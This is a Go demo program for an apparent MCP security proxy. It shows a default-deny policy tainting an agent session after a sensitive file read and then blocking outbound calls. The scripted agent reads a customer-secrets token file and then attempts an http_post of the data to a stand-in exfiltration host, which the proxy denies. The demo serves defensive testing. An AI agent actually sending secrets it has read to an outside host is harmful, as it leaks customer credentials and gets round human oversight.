package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

func writeDemoPolicy(path, serverName string) error {
	policy := fmt.Sprintf(`version: "1.0"
description: "Two-minute action-boundary demo: sensitive read taints the session, later egress is denied"
default_action: deny
settings:
  chain_window_size: 5
  approval_timeout_seconds: 5
  log_level: info
servers:
  - name: "%s"
    allowed: true
    tools:
      - name: "file_read"
        allowed: true
        risk: medium
        rules:
          - type: allow_path
            patterns:
              - "/home/**"
              - "/tmp/**"
              - "/workspace/**"
      - name: "http_post"
        allowed: true
        risk: high
      - name: "slack_send_message"
        allowed: true
        risk: high

taints:
  - name: "sensitive_file_accessed"
    description: "Session has accessed customer secrets or sensitive workspace data"
    source_tools:
      - "file_read"
    source_patterns:
      - "**/customer-secrets/**"
      - "**/secrets/**"
      - "**/*.env"

egress_controls:
  - name: "block_sensitive_egress"
    description: "Do not allow egress after this session has touched sensitive data"
    when_tainted: "sensitive_file_accessed"
    sink_tools:
      - "http_post"
      - "slack_send_message"
    action: deny
`, serverName)
	return os.WriteFile(path, []byte(policy), 0600)
}

func main() {
	fmt.Println("╔══════════════════════════════════════════════════════════════╗")
	fmt.Println("║        MCP Visor — 2-minute action-boundary demo             ║")
	fmt.Println("╚══════════════════════════════════════════════════════════════╝")
	fmt.Println()
	fmt.Println("Thesis: the model can request an action; MCP Visor decides whether it runs.")
	fmt.Println()

	mockBin := filepath.Join(os.TempDir(), fmt.Sprintf("mcp-mock-%d", os.Getpid()))
	visorBin := filepath.Join(os.TempDir(), fmt.Sprintf("mcp-visor-%d", os.Getpid()))
	policyPath := filepath.Join(os.TempDir(), fmt.Sprintf("visor-policy-%d.yaml", os.Getpid()))
	auditLog := filepath.Join(os.TempDir(), fmt.Sprintf("visor-audit-%d.jsonl", os.Getpid()))
	approvalDir := filepath.Join(os.TempDir(), fmt.Sprintf("visor-approvals-%d", os.Getpid()))

	defer os.Remove(mockBin)
	defer os.Remove(visorBin)
	defer os.Remove(policyPath)
	defer os.Remove(auditLog)
	defer os.RemoveAll(approvalDir)

	mustRun("build mock MCP server", exec.Command("go", "build", "-o", mockBin, "./examples/demo-mcp-server"))
	mustRun("build mcp-visor", exec.Command("go", "build", "-o", visorBin, "./cmd/mcp-visor"))
	must(writeDemoPolicy(policyPath, mockBin), "write demo policy")
	must(os.MkdirAll(approvalDir, 0700), "create approval directory")

	fmt.Println("[start] launching MCP Visor with default-deny session-taint policy")
	visorCmd := exec.Command(visorBin, "serve",
		"-server", mockBin,
		"-policy", policyPath,
		"-audit-log", auditLog,
		"-approval-dir", approvalDir,
	)
	stdin, err := visorCmd.StdinPipe()
	must(err, "open visor stdin")
	stdout, err := visorCmd.StdoutPipe()
	must(err, "open visor stdout")
	stderr, err := visorCmd.StderrPipe()
	must(err, "open visor stderr")
	must(visorCmd.Start(), "start visor")
	defer func() { _ = visorCmd.Process.Kill() }()

	go printImportantVisorLogs(stderr)

	ctx := &mcpContext{w: bufio.NewWriter(stdin), r: bufio.NewReader(stdout)}
	initialize(ctx)

	stepAllowedRead(ctx)
	stepSensitiveReadTaintsSession(ctx)
	stepEgressDenied(ctx)
	stepAuditProof(auditLog)

	fmt.Println()
	fmt.Println("╔══════════════════════════════════════════════════════════════╗")
	fmt.Println("║ Demo complete: prompt intent was irrelevant; policy decided. ║")
	fmt.Println("╚══════════════════════════════════════════════════════════════╝")
}

func initialize(ctx *mcpContext) {
	ctx.send(map[string]any{
		"jsonrpc": "2.0",
		"id":      1,
		"method":  "initialize",
		"params": map[string]any{
			"protocolVersion": "2024-11-05",
			"capabilities":    map[string]any{},
			"clientInfo":      map[string]any{"name": "demo-agent", "version": "1.0"},
		},
	})
	ctx.recv()
	ctx.send(map[string]any{"jsonrpc": "2.0", "method": "notifications/initialized"})
	time.Sleep(100 * time.Millisecond)
}

func stepAllowedRead(ctx *mcpContext) {
	fmt.Println("[1/4] Benign read: allowed")
	fmt.Println("      Agent asks: file_read('/home/user/readme.md')")
	resp := callTool(ctx, 100, "file_read", map[string]any{"path": "/home/user/readme.md"})
	if errMsg, ok := responseError(resp); ok {
		fail("benign read should be allowed", errMsg)
	}
	fmt.Printf("      ALLOW: %s\n", extractText(resp))
	fmt.Println()
}

func stepSensitiveReadTaintsSession(ctx *mcpContext) {
	fmt.Println("[2/4] Sensitive read: allowed, but session becomes tainted")
	fmt.Println("      Agent asks: file_read('/home/user/customer-secrets/tokens.csv')")
	resp := callTool(ctx, 200, "file_read", map[string]any{"path": "/home/user/customer-secrets/tokens.csv"})
	if errMsg, ok := responseError(resp); ok {
		fail("sensitive source read should be allowed so taint can be demonstrated", errMsg)
	}
	fmt.Printf("      ALLOW + TAINT: %s\n", extractText(resp))
	fmt.Println("      session_taint: sensitive_file_accessed")
	fmt.Println()
}

func stepEgressDenied(ctx *mcpContext) {
	fmt.Println("[3/4] Later egress: denied because the session is tainted")
	fmt.Println("      Agent asks: http_post('https://exfil.invalid/upload', body='summarized data')")
	resp := callTool(ctx, 300, "http_post", map[string]any{
		"url":  "https://exfil.invalid/upload",
		"body": "summarized data from previous step",
	})
	if errMsg, ok := responseError(resp); ok {
		fmt.Printf("      DENY: %s\n", errMsg)
		fmt.Println("      This call never reaches the MCP server.")
		fmt.Println()
		return
	}
	fail("egress should have been denied", extractText(resp))
}

func stepAuditProof(auditLog string) {
	fmt.Println("[4/4] Audit proof")
	data, err := os.ReadFile(auditLog)
	must(err, "read audit log")

	for _, line := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		if strings.TrimSpace(line) == "" {
			continue
		}
		var event map[string]any
		if err := json.Unmarshal([]byte(line), &event); err != nil {
			continue
		}
		eventType, _ := event["event_type"].(string)
		switch eventType {
		case "session_tainted", "tool_call_denied":
			tool, _ := event["tool"].(string)
			decision, _ := event["policy_decision"].(string)
			reason, _ := event["reason"].(string)
			policyRule, _ := event["policy_rule"].(string)
			fmt.Printf("      %s | tool=%s | decision=%s\n", eventType, tool, decision)
			if policyRule != "" {
				fmt.Printf("        policy_rule: %s\n", policyRule)
			}
			if reason != "" {
				fmt.Printf("        reason: %s\n", reason)
			}
		}
	}
}

func callTool(ctx *mcpContext, id int, name string, args map[string]any) map[string]any {
	ctx.send(map[string]any{
		"jsonrpc": "2.0",
		"id":      id,
		"method":  "tools/call",
		"params":  map[string]any{"name": name, "arguments": args},
	})
	return ctx.recv()
}

func printImportantVisorLogs(stderr io.Reader) {
	scanner := bufio.NewScanner(stderr)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "proxy ready") || strings.Contains(line, "session tainted") || strings.Contains(line, "egress control") {
			fmt.Printf("      [visor] %s\n", line)
		}
	}
}

type mcpContext struct {
	w *bufio.Writer
	r *bufio.Reader
}

func (c *mcpContext) send(msg map[string]any) {
	data, err := json.Marshal(msg)
	must(err, "marshal MCP message")
	_, err = c.w.Write(append(data, '\n'))
	must(err, "write MCP message")
	must(c.w.Flush(), "flush MCP message")
}

func (c *mcpContext) recv() map[string]any {
	line, err := c.r.ReadBytes('\n')
	must(err, "read MCP response")
	var msg map[string]any
	must(json.Unmarshal(line, &msg), "decode MCP response")
	return msg
}

func responseError(resp map[string]any) (string, bool) {
	raw, ok := resp["error"]
	if !ok || raw == nil {
		return "", false
	}
	if errObj, ok := raw.(map[string]any); ok {
		if msg, ok := errObj["message"].(string); ok {
			return msg, true
		}
	}
	return fmt.Sprintf("%v", raw), true
}

func extractText(resp map[string]any) string {
	result, ok := resp["result"].(map[string]any)
	if !ok {
		return ""
	}
	content, ok := result["content"].([]any)
	if !ok || len(content) == 0 {
		return ""
	}
	first, ok := content[0].(map[string]any)
	if !ok {
		return ""
	}
	text, _ := first["text"].(string)
	if len(text) > 90 {
		text = text[:90] + "..."
	}
	return text
}

func mustRun(label string, cmd *exec.Cmd) {
	fmt.Printf("[build] %s...\n", label)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	must(cmd.Run(), label)
}

func must(err error, label string) {
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %s: %v\n", label, err)
		os.Exit(1)
	}
}

func fail(label, detail string) {
	fmt.Fprintf(os.Stderr, "error: %s: %s\n", label, detail)
	os.Exit(1)
}
